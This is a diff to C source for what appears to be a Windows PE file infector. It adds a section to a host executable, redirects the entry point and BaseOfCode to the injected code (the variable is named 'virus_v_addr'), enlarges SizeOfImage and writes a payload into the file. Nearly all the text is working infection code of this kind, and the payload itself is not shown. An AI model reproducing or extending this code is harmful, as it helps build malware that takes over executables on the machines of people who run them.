@@ -21,8 +21,8 @@ payload_info_t get_payload();
 
 int main(int argc, char* argv[]) 
 {   
-    FILE *output = fopen("output.txt", "w");
-    freopen("output.txt", "w", stdout);
+    // FILE *output = fopen("output.txt", "w");
+    // freopen("output.txt", "w", stdout);
 
     payload_info_t payload_info = get_payload();
 
@@ -90,26 +90,31 @@ int main(int argc, char* argv[])
 // END adding new section header()
 
 
-
+// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+#if 1
 // Updating nt_headers
-    // DWORD OriginalEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
-    // printf("OriginalEntryPoint: %X\n", OriginalEntryPoint);
-    // printf("virus_v_addr: %X\n", virus_v_addr);
-
     i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
+
+    // key: 
     i_nt_headers.FileHeader.NumberOfSections++;
-    i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
-    // i_nt_headers.OptionalHeader.SizeOfCode += sizeof(IMAGE_SECTION_HEADER);
+     
+    // del: i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
+
+    // add: 
+    i_nt_headers.OptionalHeader.BaseOfCode = virus_v_addr;
+
     i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
         + i_nt_headers.OptionalHeader.SectionAlignment 
         - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;
+// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
     fseek(host, i_dos_header.e_lfanew, SEEK_SET);
     fwrite(&i_nt_headers, 1, sizeof(i_nt_headers), host);
 // END updating 
+#endif
 
 
-
+#if 1
 // print test for add new sect header 
     puts("After adding new sect header: ");
     // SetFilePointer(host, i_dos_header.e_lfanew + sizeof(i_nt_headers), NULL, FILE_BEGIN);
@@ -121,6 +126,7 @@ int main(int argc, char* argv[])
 // write payload
     fseek(host, sect_end, SEEK_SET);
     fwrite(payload_info.payload, 1, payload_info.size, host);
+#endif
     fclose(host);
 }
 
